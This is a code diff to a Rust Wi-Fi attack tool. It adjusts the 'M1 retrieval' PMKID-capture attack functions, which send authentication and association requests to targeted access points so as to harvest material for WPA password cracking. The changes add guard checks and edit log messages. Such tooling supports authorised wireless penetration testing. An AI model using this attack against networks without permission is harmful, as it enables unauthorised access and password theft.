@@ -264,6 +264,10 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
         return Ok(());
     }
 
+    if !ap_data.auth_sequence.cts() {
+        return Ok(());
+    }
+
     // Make an authentication frame (no_ack), so we don't over-send.
     // This will flip between sending params and not sending, hopefully one of them works.
     let frx = if oxide.counters.seq2 % 2 == 0 {
@@ -285,7 +289,7 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
     ap_data.interactions += 1;
     oxide.status_log.add_message(StatusMessage::new(
         MessageType::Info,
-        format!("M1 Retrieval - sent authentication [{}]", ap_mac),
+        format!("M1 Retrieval - Sent Authentication Req [{}]", ap_mac),
     ));
 
     Ok(())
@@ -297,10 +301,12 @@ pub fn m1_retrieval_attack_phase_2(
     client_mac: &MacAddress,
     oxide: &mut OxideRuntime,
 ) -> Result<(), String> {
+    // Return if PMKID is disabled
     if oxide.config.disable_pmkid {
         return Ok(());
     }
 
+    // Return if no-transmit is on
     if oxide.config.notx {
         return Ok(());
     }
@@ -309,30 +315,23 @@ pub fn m1_retrieval_attack_phase_2(
     let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
         ap
     } else {
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("M1 Retrieval - no AP [{}]", ap_mac),
-        ));
         return Ok(());
     };
 
     if !oxide.target_data.targets.is_target(ap_data) {
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("M1 Retrieval - not a target? [{}]", ap_mac),
-        ));
         return Ok(());
     }
 
     if oxide.target_data.whitelist.is_whitelisted(ap_data) {
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("M1 Retrieval - is whitelisted? [{}]", ap_mac),
-        ));
         return Ok(());
     }
 
-    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
+    // if we already have a PMKID, return
+    if ap_data.has_pmkid {
+        return Ok(());
+    }
+
+    if !ap_data.auth_sequence.cts() {
         return Ok(());
     }
 
@@ -341,6 +340,7 @@ pub fn m1_retrieval_attack_phase_2(
     } else {
         RsnCipherSuite::CCMP
     };
+
     let gs: RsnCipherSuite = if ap_data.information.gs_tkip.is_some_and(|f| f) {
         RsnCipherSuite::TKIP
     } else {
@@ -361,7 +361,7 @@ pub fn m1_retrieval_attack_phase_2(
     ap_data.interactions += 1;
     oxide.status_log.add_message(StatusMessage::new(
         MessageType::Info,
-        format!("M1 Retrieval - sent association [{}]", ap_mac),
+        format!("M1 Retrieval - Sent Association Req [{}]", ap_mac),
     ));
 
     Ok(())
